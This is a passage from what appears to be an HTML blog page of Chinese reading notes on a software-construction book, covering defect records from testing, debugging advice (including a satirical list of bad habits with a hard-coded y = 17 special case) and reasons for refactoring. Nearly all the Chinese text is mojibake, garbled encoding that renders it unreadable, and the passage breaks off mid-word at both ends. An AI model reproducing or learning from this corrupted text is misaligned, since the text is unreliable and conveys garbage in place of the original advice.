‡ï¼Œä»¥åŠå­ç¨‹åºè°ƒç”¨é”™è¯¯ç­‰</li><li>ä¿®æ­£é”™è¯¯æ‰€æ”¹å˜çš„ç±»å’Œå­ç¨‹åº</li><li>ç¼ºé™·æ‰€å½±å“çš„ä»£ç è¡Œæ•°</li><li>æŸ¥æ‰¾è¯¥é”™è¯¯æ‰€èŠ±çš„å°æ—¶æ•°</li><li>ä¿®æ­£é”™è¯¯æ‰€èŠ±è´¹çš„å°æ—¶æ•°</li></ul><p>é€šè¿‡æµ‹è¯•è®°å½•å¯ä»¥</p><ul><li>å¯¹æ¯ä¸€ä¸ªç±»ä¸­çš„ç¼ºé™·æ•°ç›®ç»Ÿè®¡ï¼Œä»æœ€ç³Ÿç³•çš„ç±»åˆ°æœ€å¥½çš„ç±»ä¾æ¬¡åˆ—å‡ºï¼Œå¦‚æœç±»çš„è§„æ¨¡ä¸åŒï¼Œå¯èƒ½éœ€è¦å¯¹è¿™ä¸€æ•°å­—è¿›è¡Œå½’ä¸€åŒ–å¤„ç†</li><li>æŒ‰ç…§åŒæ ·çš„æ–¹å¼åˆ—å‡ºæ¯ä¸ªå­ç¨‹åºä¸­çš„ç¼ºé™·æ•°ï¼Œä¹Ÿå¯èƒ½éœ€è¦æ ¹æ®å­ç¨‹åºå¤§å°å½’ä¸€åŒ–å¤„ç†</li><li>å‘ç°ä¸€ä¸ªé”™è¯¯å¹³å‡æ‰€éœ€è¦èŠ±è´¹çš„æµ‹è¯•æ—¶é—´</li><li>æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹æ‰€å‘ç°ç¼ºé™·çš„å¹³å‡æ•°</li><li>ä¿®æ­£ä¸€ä¸ªç¼ºé™·èŠ±è´¹çš„å¹³å‡ç¼–ç¨‹æ—¶é—´</li><li>å…¨éƒ¨æµ‹è¯•ç”¨ä¾‹çš„ä»£ç è¦†ç›–ç‡</li><li>åœ¨å„ä¸ªä¸¥é‡çº§åˆ«ä¸­æœªå¤„ç†ç¼ºé™·çš„æ•°é‡</li></ul><p><strong>æµ‹è¯•æ•°æ®æœ¬èº«å‡ºé”™çš„å¯†åº¦å¾€å¾€æ¯”è¢«æµ‹ä»£ç è¿˜è¦é«˜</strong>ã€‚æŸ¥æ‰¾è¿™ç§é”™è¯¯å®Œå…¨æ˜¯æµªè´¹æ—¶é—´ï¼Œåˆä¸èƒ½å¯¹ä»£ç æœ‰æ‰€æ”¹å–„ï¼Œå› æ­¤æµ‹è¯•æ•°æ®é‡Œé¢çš„é”™è¯¯æ›´åŠ è®©äººçƒ¦æ¼ã€‚è¦åƒå†™ä»£ç ä¸€æ ·å°å¿ƒåœ°å¼€å‘æµ‹è¯•ç”¨ä¾‹ï¼Œè¿™æ ·æ‰èƒ½é¿å…äº§ç”Ÿè¿™ç§é—®é¢˜ã€‚</p><h2 id="ç¬¬23ç« -è°ƒè¯•"><a href="#ç¬¬23ç« -è°ƒè¯•" class="headerlink" title="ç¬¬23ç«  è°ƒè¯•"></a>ç¬¬23ç«  è°ƒè¯•</h2><p><strong>è¯·ä¸è¦é€šè¿‡åå¤å°è¯•ç¼–ç¨‹ï¼ï¼ï¼</strong></p><h3 id="ä½ å¯ä»¥ä»-bug-ä¸­è·å¾—ä»¥ä¸‹å¥½å¤„"><a href="#ä½ å¯ä»¥ä»-bug-ä¸­è·å¾—ä»¥ä¸‹å¥½å¤„" class="headerlink" title="ä½ å¯ä»¥ä» bug ä¸­è·å¾—ä»¥ä¸‹å¥½å¤„"></a>ä½ å¯ä»¥ä» bug ä¸­è·å¾—ä»¥ä¸‹å¥½å¤„</h3><ul><li><strong>ç†è§£ä½ æ­£åœ¨ç¼–å†™çš„ç¨‹åº</strong>ã€‚å¦‚æœä½ ç¡®å®å·²ç»é€å½»åœ°ç†è§£äº†å®ƒï¼Œè¿™ä¸ªç¨‹åºå°±ä¸åº”è¯¥è¿˜æœ‰bugã€‚</li><li><strong>æ˜ç¡®ä½ çŠ¯äº†å“ªç§ç±»å‹çš„é”™è¯¯</strong>ã€‚ä¸€æ—¦ä½ å‘ç°äº†é”™è¯¯ï¼Œè¯·é—®é—®è‡ªå·±ä¸ºä»€ä¹ˆä¼šçŠ¯è¿™æ ·çš„é”™è¯¯ã€‚ä½ å¦‚ä½•æ‰èƒ½æ›´å¿«åœ°å‘ç°è¿™ä¸ªé”™è¯¯ï¼Ÿä½ å¦‚ä½•æ‰èƒ½é¢„é˜²æ­¤ç±»é”™è¯¯çš„å‘ç”Ÿï¼Ÿä»£ç é‡Œé¢è¿˜æœ‰ç±»ä¼¼çš„é”™è¯¯ä¹ˆï¼Ÿä½ èƒ½åœ¨è¿™äº›é”™è¯¯é€ æˆéº»çƒ¦ä¹‹å‰æ”¹æ­£å®ƒä»¬ä¹ˆï¼Ÿ</li><li><strong>ä»ä»£ç é˜…è¯»è€…çš„è§’åº¦åˆ†æä»£ç è´¨é‡</strong>ã€‚ä»£ç æ˜“è¯»ä¹ˆï¼Ÿå®ƒæ€æ ·æ‰èƒ½æ›´å¥½ï¼Ÿç”¨ä½ çš„ç»“è®ºé‡æ„ä½ ç°åœ¨çš„ä»£ç ï¼Œå¹¶è®©è‡ªå·±ä¸‹æ¬¡ç¼–å†™çš„ä»£ç æ›´å¥½ã€‚</li><li><strong>å®¡è§†è‡ªå·±è§£å†³é—®é¢˜çš„æ–¹æ³•</strong>ã€‚ä½ è‡ªå·±è§£å†³è°ƒè¯•é—®é¢˜æ—¶ç”¨åˆ°çš„æ–¹æ³•ä½¿ä½ æ„Ÿåˆ°è‡ªä¿¡å—ï¼Ÿä½ çš„æ–¹æ³•ç®¡ç”¨ä¹ˆï¼Ÿä½ èƒ½å¤Ÿå¾ˆå¿«åœ°å‘ç°ç¼ºé™·ä¹ˆï¼Ÿæˆ–è€…æ­£æ˜¯ä½ çš„æ–¹æ³•å¯¼è‡´è°ƒè¯•å·¥ä½œæˆæ•ˆå¾ˆå·®ï¼Ÿè°ƒè¯•è¿‡ç¨‹ä¸­ä½ æœ‰ç—›è‹¦å’ŒæŒ«è´¥æ„Ÿä¹ˆï¼Ÿä½ æ˜¯åœ¨èƒ¡ä¹±çŒœæµ‹ä¹ˆï¼Ÿä½ çš„è°ƒè¯•æ–¹æ³•éœ€è¦æ”¹è¿›ä¹ˆï¼ŸèŠ±ç‚¹æ—¶é—´æ¥åˆ†æå¹¶æ”¹è¿›ä½ çš„è°ƒè¯•æ–¹æ³•ï¼Œå¯èƒ½å°±æ˜¯å‡å°‘ç¨‹åºå¼€å‘æ—¶é—´çš„æœ€æœ‰æ•ˆæ–¹æ³•ã€‚</li><li><strong>å®¡è§†è‡ªå·±ä¿®æ­£ç¼ºé™·çš„æ–¹æ³•</strong>ã€‚è§£å†³æ–¹æ³•æ˜¯å¦æ²»æ ‡ä¸æ²»æœ¬å‘¢ï¼Ÿæ˜¯å¦åº”è¯¥ä»ç³»ç»Ÿè§’åº¦è¿›è¡Œä¿®æ­£ï¼Œé€šè¿‡ç²¾ç¡®çš„åˆ†æå¯¹é—®é¢˜çš„æ ¹æœ¬åŸå› å¯¹ç—‡ä¸‹è¯å‘¢ï¼Ÿ</li></ul><p>è°ƒè¯•å…¶å®æ˜¯ä¸€ç‰‡æå…¶å¯Œé¥¶çš„åœŸåœ°ï¼Œå®ƒå­•è‚²ç€ä½ è¿›æ­¥çš„ç§å­ã€‚è¿™ç‰‡åœŸåœ°ä¹Ÿæ˜¯æ‰€æœ‰è½¯ä»¶æ„å»ºä¹‹è·¯æ‰€äº¤ç»‡çš„åœ°æ–¹ï¼šå¯é æ€§ã€è®¾è®¡ã€è½¯ä»¶è´¨é‡ï¼Œå‡¡æ˜¯ä½ èƒ½æƒ³åˆ°çš„æ— æ‰€ä¸åŒ…ã€‚è¿™å‡ ä¹ç­‰åŒäºç¼–å†™ä¼˜ç§€ä»£ç æ‰€å¾—åˆ°çš„å›æŠ¥ã€‚å¦‚æœä½ èƒ½ç²¾äºæ­¤é“ï¼Œä½ ç”šè‡³æ— é¡»é¢‘ç¹è°ƒè¯•ã€‚</p><h3 id="è°ƒè¯•ä¹‹é­”é­‚æŒ‡å—"><a href="#è°ƒè¯•ä¹‹é­”é­‚æŒ‡å—" class="headerlink" title="è°ƒè¯•ä¹‹é­”é­‚æŒ‡å—"></a>è°ƒè¯•ä¹‹é­”é­‚æŒ‡å—</h3><ul><li><strong>å‡­çŒœæµ‹æ‰¾å‡ºç¼ºé™·</strong>ã€‚è¦æ‰¾å‡ºç¼ºé™·ï¼Œè¯·æŠŠprintè¯­å¥éšæœºåœ°æ•£å¸ƒåœ¨ç¨‹åºä¸­ã€‚æ£€æŸ¥è¿™äº›è¯­å¥çš„è¾“å‡ºæ¥ç¡®å®šç¼ºé™·åˆ°åº•åœ¨å“ªé‡Œã€‚å¦‚æœé€šè¿‡printè¯­å¥è¿˜æ˜¯ä¸èƒ½æ‰¾åˆ°ç¼ºé™·ï¼Œé‚£ä¹ˆå°±åœ¨ç¨‹åºä¸­ä¿®æ”¹ç‚¹ä»€ä¹ˆï¼Œç›´åˆ°æœ‰äº›ä¸œè¥¿å¥½åƒèƒ½å¹²æ´»äº†ã€‚ä¸è¦å¤‡ä»½ç¨‹åºçš„åŸå§‹ç‰ˆæœ¬ï¼Œä¹Ÿä¸è¦è®°å½•ä½ åšäº†å“ªäº›æ”¹å˜ã€‚åªæœ‰åœ¨ä½ æ— æ³•ç¡®å®šè‡ªå·±çš„ç¨‹åºæ­£åœ¨å¹²ä»€ä¹ˆçš„æ—¶å€™ï¼Œç¼–ç¨‹æ‰æ¯”è¾ƒåˆºæ¿€ã€‚è¯·ææ—©å‡†å¤‡ä¸€äº›å¯ä¹å’Œç³–æœï¼Œå› ä¸ºä½ ä¼šåœ¨æ˜¾ç¤ºå™¨å‰åº¦è¿‡ä¸€ä¸ªæ¼«æ¼«é•¿å¤œã€‚</li><li><strong>ä¸è¦æŠŠæ—¶é—´æµªè´¹åœ¨ç†è§£é—®é¢˜ä¸Š</strong>ã€‚å‡ºç°çš„é—®é¢˜ä¸å€¼ä¸€æï¼Œè¦è§£å†³å®ƒä»¬å¹¶ä¸éœ€è¦å½»åº•å¼„æ‡‚ç¨‹åºã€‚åªè¦æ‰¾å‡ºé—®é¢˜å°±è¡Œäº†ã€‚</li><li><strong>ç”¨æœ€å”¾æ‰‹å¯å¾—çš„æ–¹å¼ä¿®æ­£é”™è¯¯</strong>ã€‚ä¸å…¶æŠŠæ—¶é—´æµªè´¹åœ¨ä¸€ä¸ªåºå¤§ã€é›„å¿ƒä¸‡ä¸ˆçš„ï¼Œç”šè‡³å¯èƒ½å½±å“æ•´ä¸ªç¨‹åºçš„ä¿®æ­£å·¥ä½œä¸Šï¼Œè¿˜ä¸å¦‚ç›´æ¥å»è§£å†³ä½ æ‰€é¢å¯¹çš„é‚£ä¸ªç‰¹æ®Šé—®é¢˜ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œç¾çš„ä¾‹å­ï¼Œå¦‚æœåœ¨è¿™é‡Œå†™ä¸€æ®µç‰¹ä¾‹å¤„ç†ä»£ç å°±å¯ä»¥è§£å†³é—®é¢˜ï¼Œè°ä¼šå»å¯¹<code>Compute()</code>å¯»æ ¹ç©¶åº•ï¼Œå¼„æ¸…ä¸å€¼17æœ‰å…³çš„æ£˜æ‰‹é—®é¢˜ç©¶ç«Ÿæ˜¯ä»€ä¹ˆã€‚<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">x</span> = Compute(<span class="symbol">y</span>)</span><br><span class="line"><span class="keywords">if</span> (<span class="symbol">y</span> = <span class="number">17</span>) </span><br><span class="line"><span class="symbol">x</span> = $<span class="number">25.15</span> <span class="comment">// å½“ y=17 æ—¶ï¼ŒCompute()æ²¡æœ‰èµ·ä½œç”¨ï¼Œå› æ­¤éœ€è¦ä¿®æ”¹</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="è¿·ä¿¡å¼ç¼–ç¨‹"><a href="#è¿·ä¿¡å¼ç¼–ç¨‹" class="headerlink" title="è¿·ä¿¡å¼ç¼–ç¨‹"></a>è¿·ä¿¡å¼ç¼–ç¨‹</h3><p><em>æ¯ä¸ªå›¢é˜Ÿé‡Œéƒ½ä¹Ÿè®¸æœ‰è¿™æ ·ä¸€ä¸ªç¨‹åºå‘˜ï¼Œä»–æ€»ä¼šé‡åˆ°æ— ç©·çš„é—®é¢˜ï¼šä¸å¬è¯çš„æœºå™¨ï¼Œå¥‡æ€ªçš„ç¼–è¯‘å™¨é”™è¯¯ï¼Œæœˆåœ†æ—¶ã‚ªä¼šå‡ºç°çš„ç¼–ç¨‹è¯­è¨€çš„éšè—ç¼ºé™·ï¼Œå¤±æ•ˆçš„æ•°æ®ï¼Œå¿˜è®°åšçš„é‡è¦æ”¹åŠ«ï¼Œä¸€ä¸ªä¸èƒ½æ­£å¸¸ä¿å­˜ç¨‹åºçš„ç–¯ç‹‚çš„ç¼–è¾‘å™¨ã€‚</em></p><p>è¦çŸ¥é“ï¼Œ<strong>å¦‚æœä½ å†™çš„ç¨‹åºå‡ºäº†é—®é¢˜ï¼Œé‚£å°±æ˜¯ä½ çš„åŸå› </strong>ï¼Œä¸æ˜¯è®¡ç®—æœºçš„ï¼Œä¹Ÿä¸æ˜¯ç¼–è¯‘å™¨çš„ã€‚ç¨‹åºä¸ä¼šæ¯æ¬¡éƒ½äº§ç”Ÿä¸åŒçš„ç»“æœã€‚å®ƒä¸æ˜¯è‡ªå·±å†™å‡ºæ¥çš„ï¼Œæ˜¯ä½ å†™çš„ï¼Œæ‰€ä»¥ï¼Œè¯·å¯¹å®ƒè´Ÿè´£ã€‚å³ä½¿æŸä¸ªé”™è¯¯åˆçœ‹ä¼¼ä¹ä¸èƒ½å½’å’äºä½ ï¼Œä½†å‡ºäºä½ è‡ªèº«çš„åˆ©ç›Šï¼Œæœ€å¥½è¿˜æ˜¯å‡è®¾å®ƒæ˜¯ç”±ä½ äº§ç”Ÿçš„ã€‚è¿™æ ·çš„å‡è®¾å°†æœ‰åŠ©äºä½ çš„è°ƒè¯•ã€‚åŒæ—¶é¿å…ä½ å…ˆæŒ‡è´£åˆ«äººçŠ¯äº†é”™ï¼Œæœ€ç»ˆå´å‘ç°é”™è¯¯å…¶å®ç”±ä½ è€Œç”Ÿçš„å°´å°¬åœºæ™¯ã€‚</p><p><strong>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒæŸ¥æ‰¾ bug å¹¶ç†è§£ bug é€šå¸¸å ç”¨äº†æ•´ä¸ªè°ƒè¯•å·¥ä½œçš„ 90%ã€‚</strong></p><h3 id="ç§‘å­¦çš„è°ƒè¯•æ–¹æ³•"><a href="#ç§‘å­¦çš„è°ƒè¯•æ–¹æ³•" class="headerlink" title="ç§‘å­¦çš„è°ƒè¯•æ–¹æ³•"></a>ç§‘å­¦çš„è°ƒè¯•æ–¹æ³•</h3><ol><li>ç¡®ä¿ bug å¯ä»¥ç¨³å®šå¤ç°</li><li>ç¡®å®š bug ä½ç½®</li><li>1 æ”¶é›†äº§ç”Ÿ bug çš„ç›¸å…³æ•°æ®</li><li>2 åˆ†ææ‰€æ”¶é›†çš„æ•°æ®ï¼Œå¹¶ä½œå‡º bug äº§ç”Ÿçš„å‡è®¾</li><li>3 ç¡®å®šå¦‚ä½•è¯å®æˆ–è¯ä¼ªè¯¥å‡è®¾ï¼Œå¯ä»¥å¯¹ç¨‹åºæµ‹è¯•æˆ–æ£€æŸ¥ä»£ç </li><li>4 é€šè¿‡ 2.3 æ–¹æ³•å¯¹å‡è®¾ä½œå‡ºæœ€ç»ˆç»“è®º</li><li>ä¿®å¤ bug</li><li>å¯¹ä¿®å¤ç»“æœæµ‹è¯•</li><li>æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ç±»ä¼¼é”™è¯¯</li></ol><h3 id="æŸ¥æ‰¾-bug-çš„ä¸€äº›å»ºè®®"><a href="#æŸ¥æ‰¾-bug-çš„ä¸€äº›å»ºè®®" class="headerlink" title="æŸ¥æ‰¾ bug çš„ä¸€äº›å»ºè®®"></a>æŸ¥æ‰¾ bug çš„ä¸€äº›å»ºè®®</h3><ul><li>å¦‚æœä¸€ä¸ªé”™è¯¯æ— æ³•é‡ç°ï¼Œè¿™é€šå¸¸æ˜¯ä¸€ä¸ªåˆå§‹åŒ–é”™è¯¯ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªåŒæ—¶é—´æœ‰å…³çš„é—®é¢˜ï¼Œæˆ–è€…æ˜¯æ‚¬ç©ºæŒ‡é’ˆé—®é¢˜ã€‚</li><li>å¦‚æœå‡ºç°äº†ä¸€ä¸ªéš¾äºç¡®è¯Šçš„æ–°é”™è¯¯ï¼Œè¿™ä¸ªé”™è¯¯é€šå¸¸æ˜¯åŒé‚£äº›æœ€æ–°ä¿®æ”¹çš„ä»£ç ç›¸å…³ã€‚</li><li>å¢é‡å¼é›†æˆã€‚å½“ä½ æ¯æ¬¡åªå¯¹ç³»ç»Ÿæ·»åŠ ä¸€ä¸ªä»£ç ç‰‡æ®µï¼Œè°ƒè¯•å°†å˜å¾—å¾ˆå®¹æ˜“ã€‚å¦‚æœåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œåˆ™åº”å°†æ‰€æ·»åŠ çš„ä»£ç æå–å‡ºæ¥å•ç‹¬æµ‹è¯•ã€‚</li><li><strong>å°†æ‰€æœ‰å¯èƒ½çš„æƒ…å†µç½—åˆ—å‡ºæ¥ï¼Œå¹¶é€ä¸€éªŒè¯ï¼Œé¿å…åœ¨æŸä¸€ç§å›°å¢ƒä¸­å‘†çš„å¤ªä¹…ã€‚</strong></li><li>ç¼©å°ä»£ç å«Œç–‘ã€‚é€šè¿‡æ‰“å°è¾“å‡ºã€æ—¥å¿—ã€è¯·æ±‚é“¾è·Ÿè¸ªç­‰æ–¹å¼è¿›ä¸€æ­¥ç²¾ç¡®é—®é¢˜å¯èƒ½å‘ç”Ÿçš„ä½ç½®ã€‚</li><li>æ‰©å¤§å«Œç–‘ä»£ç ã€‚å¦‚æœåœ¨æŸä¸ªä»£ç èŒƒå›´å†…æ²¡èƒ½æ‰¾åˆ°é—®é¢˜ï¼Œè¯·è€ƒè™‘é—®é¢˜æ˜¯å¦çš„ç¡®ä¸åœ¨è¯¥ä»£ç æ®µå†…ã€‚</li><li><strong>å¯¹ä¹‹å‰å‡ºç°è¿‡é—®é¢˜çš„ç±»ä¸å­ç¨‹åºä¿æŒè­¦æƒ•ï¼Œå®ƒä»¬å¾ˆå¯èƒ½å†æ¬¡â€œä½œæ¡ˆâ€ã€‚</strong></li><li>åŒå…¶ä»–äººè®¨è®ºã€‚<strong>å½“ä½ å‘åˆ«äººè§£é‡Šè‡ªå·±çš„ç¨‹åºæ—¶ï¼Œå¸¸å¸¸èƒ½å‘ç°è‡ªå·±çŠ¯ä¸‹çš„é”™è¯¯ã€‚</strong></li><li>æŠ›å¼€é—®é¢˜ï¼Œä¼‘æ¯ä¸€ä¸‹ã€‚<strong>å¦‚æœä½ è°ƒè¯•äº†å¾ˆä¹…å´æ¯«æ— è¿›å±•ï¼Œåªè¦ä½ å°è¯•å®Œæ‰€æœ‰çš„å¯èƒ½ï¼ŒæŠŠé—®é¢˜æ”¾åœ¨ä¸€è¾¹å§ï¼</strong>å‡ºå»æ•£æ•£æ­¥ï¼Œåšä¸€äº›å…¶ä»–çš„äº‹æƒ…ã€‚å›å®¶ä¼‘æ¯ä¸€å¤©ï¼Œè®©ä½ çš„ç¥ç»åœ¨æ½œæ„è¯†ä¸­é‡Šæ”¾å‡ºé—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚</li></ul><h3 id="ä¿®å¤-bug"><a href="#ä¿®å¤-bug" class="headerlink" title="ä¿®å¤ bug"></a>ä¿®å¤ bug</h3><p>ä¸€é¡¹è°ƒæŸ¥æ˜¾ç¤ºï¼Œ<strong>ç¬¬ä¸€æ¬¡å¯¹ bug çš„ä¿®å¤æœ‰ 50% çš„å‡ ç‡å‡ºé”™</strong>ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å‡å°‘å‡ºé”™çš„å»ºè®®ï¼š</p><ul><li>åœ¨åŠ¨æ‰‹å‰å…ˆç†è§£é—®é¢˜</li><li>ç†è§£ç¨‹åºæœ¬èº«ï¼Œè€Œä¸ä»…ä»…æ˜¯é—®é¢˜ã€‚å¯¹é¡¹ç›®çš„äº†è§£è¶Šå¤šï¼Œè¶Šä¸å®¹æ˜“å‡ºé”™ï¼›è¿‡äºåºå¤§çš„é¡¹ç›®è‡³å°‘è¦äº†è§£ bug çš„ä¸Šä¸‹æ–‡ã€‚</li><li>éªŒè¯å¯¹é”™è¯¯çš„åˆ†æã€‚ç¡®å®šä½ æ‰¾åˆ°çš„çœŸæ­£çš„ bug</li><li><strong>è¶Šæ˜¯ç´§æ€¥æƒ…å†µä¸‹è¶Šå®¹æ˜“å‡ºç°é—®é¢˜</strong>ã€‚å¦‚èµ¶ç«è½¦å‰çªç„¶å‘ç°çš„é—®é¢˜ï¼Œä¸€ä¸ªéå¸¸å°çš„ç´§æ€¥ bug ä¸ç»æµ‹è¯•ä¾¿å‘å¸ƒã€‚ç»éªŒå‘Šè¯‰æˆ‘ä»¬ï¼Œè¶Šæ˜¯æ…Œä¹±ï¼Œè¶Šå®¹æ˜“å‡ºé—®é¢˜ï¼Œå¦‚æœä½ æ— æ³•æ³°ç„¶å¤„ä¹‹ï¼Œè¯·ä¸åŒäº‹ä¸€èµ·å¤„ç†ã€‚</li><li>ä¼‘æ¯ä¸€ä¸‹ã€‚å¦‚æœä½ æ— æ³•ç¡®å®šæ˜¯å¦å½»åº•è§£å†³äº†é—®é¢˜ï¼Œå¹¶ä¸”æ—¶é—´å…è®¸ï¼Œè¯·æ”¾æ¾ä¸€ä¸‹ï¼Œæ­£ç¡®è§£å†³é—®é¢˜è¿œæ¯”åŒ†å¿™é”™è¯¯è§£å†³é—®é¢˜é‡è¦ã€‚</li><li>ä¿å­˜æœ€åˆçš„æºä»£ç ã€‚å¦‚æœä½ çš„ä¿®æ”¹æ²¡æœ‰å¥æ•ˆï¼Œæˆ–è€…å¼•å‘äº†æ–°çš„é—®é¢˜ï¼Œè¯·æ¯”å¯¹ä¸€ä¸‹ä¿®æ”¹æ˜¯å¦æ­£ç¡®ã€‚</li><li>æ²»æœ¬ï¼Œè€Œä¸æ˜¯æ²»æ ‡ã€‚å¦‚æœæ²¡æœ‰å½»åº•ç†è§£é—®é¢˜ï¼Œå°±ä¸è¦å»ä¿®æ”¹ä»£ç ã€‚å¦‚æœä»…ä»…æ²»æ ‡ï¼Œä½ åªä¼šæŠŠä»£ç æå¾—æ›´ç³Ÿç³•ã€‚</li><li>ä¸€æ¬¡åªåšä¸€ä¸ªæ”¹åŠ¨</li><li>æ£€æŸ¥è‡ªå·±çš„æ”¹åŠ¨</li><li>å¢åŠ èƒ½æš´éœ²é—®é¢˜çš„å•å…ƒæµ‹è¯•</li><li>æœç´¢ç±»ä¼¼çš„ç¼ºé™·ã€‚å¦‚æœä½ æƒ³ä¸å‡ºå¦‚ä½•æŸ¥æ‰¾ç±»ä¼¼ç¼ºé™·ï¼Œè¿™å°±æ„å‘³ç€ä½ è¿˜æ²¡æœ‰å®Œå…¨ç†è§£é—®é¢˜ã€‚</li></ul><p>ä¸è¦è®©ä½ çš„ä»£ç è¢«ç‰¹ä¾‹æ‰€çº ç¼ ã€‚</p><h2 id="ç¬¬24ç« -é‡æ„"><a href="#ç¬¬24ç« -é‡æ„" class="headerlink" title="ç¬¬24ç«  é‡æ„"></a>ç¬¬24ç«  é‡æ„</h2><p>è½¯ä»¶æ¼”åŒ–å°±åƒç”Ÿç‰©è¿›åŒ–ä¸€æ ·ï¼Œæœ‰äº›çªå˜æ˜¯å¯¹ç‰©ç§æœ‰ç›Šçš„ï¼Œå¦ä¸€äº›åˆ™æ˜¯æœ‰å®³çš„ã€‚è‰¯æ€§çš„è½¯ä»¶æ¼”åŒ–ä½¿ä»£ç å¾—åˆ°äº†å‘å±•ã€‚</p><p>è½¯ä»¶æ¼”åŒ–çš„åŸºæœ¬å‡†åˆ™ï¼šæ¼”åŒ–åº”å½“æå‡ç¨‹åºçš„å†…åœ¨è´¨é‡ã€‚</p><h3 id="é‡æ„çš„ç†ç”±"><a href="#é‡æ„çš„ç†ç”±" class="headerlink" title="é‡æ„çš„ç†ç”±"></a>é‡æ„çš„ç†ç”±</h3><ul><li>ä»£ç é‡å¤</li><li>å†—é•¿çš„å­ç¨‹åº</li><li>å¾ªç¯è¿‡é•¿æˆ–åµŒå¥—è¿‡æ·±ã€‚å¾ªç¯å†…éƒ¨å¤æ‚çš„å­ç¨‹åºé€šå¸¸å…·å¤‡è½¬æ¢ä¸ºå­ç¨‹åºçš„æ½œè´¨ã€‚</li><li>å†…èšæ€§å¤ªå·®çš„ç±»</li><li>ç±»çš„æ¥å£æœªèƒ½æä¾›å±‚æ¬¡ä¸€è‡´çš„æŠ½è±¡</li><li>æ‹¥æœ‰å¤ªå¤šå‚æ•°çš„å‚æ•°åˆ—è¡¨ã€‚å¦‚æœä¸€ä¸ªå­ç¨‹åºè¢«åˆ†è§£çš„å¾ˆå¥½ï¼Œé‚£ä¹ˆå®ƒçš„å­ç¨‹åºåº”å½“å°å·§ã€å®šä¹‰ç²¾ç¡®ï¼Œä¸”ä¸éœ€è¦åºå¤§çš„å‚æ•°åˆ—è¡¨ã€‚</li><li>å˜åŒ–å¯¼è‡´å¯¹å¤šä¸ªç±»çš„ç›¸åŒä¿®æ”¹</li><li>å¯¹ç»§æ‰¿ä½“ç³»åŒæ ·çš„ä¿®æ”¹</li><li>case è¯­å¥éœ€è¦åšç›¸åŒçš„ä¿®æ”¹</li><li>åŒæ—¶ä½¿ç”¨çš„ç›¸å…³æ•°æ®å¹¶æœªä»¥ç±»çš„æ–¹å¼è¿›è¡Œç»„ç»‡</li><li>æˆå‘˜å‡½æ•°ä½¿ç”¨å…¶ä»–ç±»çš„ç‰¹å¾æ¯”ä½¿ç”¨è‡ªèº«ç±»çš„ç‰¹å¾è¿˜è¦å¤š</li><li>è¿‡å¤šä½¿ç”¨åŸºæœ¬æ•°æ®ç±»å‹ã€‚åŸºæœ¬æ•°æ®ç±»å‹å¯ç”¨äºè¡¨ç¤ºçœŸå®ä¸–ç•Œä¸­å®ä½“çš„ä»»æ„æ•°é‡ã€‚å¦‚æœç¨‹åºä¸­ä½¿ç”¨äº†æ•´å‹è¿™æ ·çš„æ•°æ®ç±»å‹è¡¨ç¤ºæŸç§å¸¸è§çš„å®ä½“ï¼Œå¦‚è´§å¸ï¼Œè¯·è€ƒè™‘åˆ›å»ºä¸€ä¸ªç®€å•çš„ money ç±»ï¼Œè¿™æ ·ç¼–è¯‘å™¨å°±å¯ä»¥å¯¹ money å˜é‡æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œä½ ä¹Ÿå¯ä»¥å¯¹èµ‹ç»™ money çš„å€¼æ·»åŠ å®‰å…¨æ£€æŸ¥ç­‰åŠŸèƒ½ã€‚</li><li>æŸä¸ªç±»æ— æ‰€äº‹äº‹</li><li>ä¸€äº›åˆ—ä¼ é€’æµæµªæ•°æ®ï¼ˆæ•°æ®åªæ˜¯è¢«ä¼ æ¥ä¼ å»è€Œä¸åšä»»ä½•æ•°æ®ï¼‰çš„å­ç¨‹åº</li><li>å¦‚æœçœ‹åˆ°æŸä¸ªç±»ä¸­çš„ç»å¤§éƒ¨åˆ†ä»£ç åªæ˜¯å»è°ƒç”¨å…¶ä»–ç±»ä¸­çš„æˆå‘˜å‡½æ•°ï¼Œè¯·è€ƒè™‘æ˜¯å¦åº”è¯¥æŠŠè¿™æ ·çš„ä¸­é—´äººå»æ‰ï¼Œè½¬è€Œå»ç›´æ¥è°ƒç”¨å…¶ä»–çš„ç±»</li><li><strong>æŸä¸ªç±»åŒå…¶ä»–ç±»å…³ç³»è¿‡äºäº²å¯†</strong>ã€‚ç±»çš„ä½œç”¨æ˜¯ä½¿ç¨‹åºå…·å¤‡æ›´å¼ºçš„å¯ç®¡ç†è¡Œï¼Œå¹¶æœ€å¤§é™åº¦åœ°å‡å°‘æ›´æ”¹ä»£ç å¯¹å‘¨å›´çš„è¿å¸¦å½±å“ã€‚</li><li>å­ç¨‹åºå‘½åä¸æ°å½“</li><li>æ•°æ®æˆå‘˜è¢«è®¾ç½®ä¸ºå…¬ç”¨</li><li>æŸä¸ªæ´¾ç”Ÿç±»ä»…ä½¿ç”¨äº†åŸºç±»çš„å¾ˆå°‘ä¸€éƒ¨åˆ†æˆå‘˜å‡½æ•°ã€‚æ›´å®Œå–„çš„å°è£…åº”è¯¥æ˜¯ï¼ŒæŠŠæ´¾ç”Ÿç±»ç›¸å¯¹äºåŸºç±»çš„å…³ç³»ä»â€œis-aâ€è½¬å˜ä¸ºâ€œhas-aâ€ã€‚å³æŠŠåŸºç±»è½¬æ¢ä¸ºåŸæ¥çš„æ´¾ç”Ÿç±»çš„æ•°æ®æˆå‘˜ï¼Œç„¶åä»…ä»…ä¸ºåŸæ¥çš„æ´¾ç”Ÿç±»æä¾›æ‰€éœ€è¦çš„æˆå‘˜å‡½æ•°ã€‚</li><li>æ³¨é‡Šè¢«ç”¨äºè§£é‡Šéš¾æ‡‚çš„ä»£ç ã€‚â€œ<strong>ä¸è¦ä¸ºæ‹™åŠ£çš„ä»£ç ç¼–å†™æ–‡æ¡£â€”â€”åº”å½“é‡å†™ä»£ç 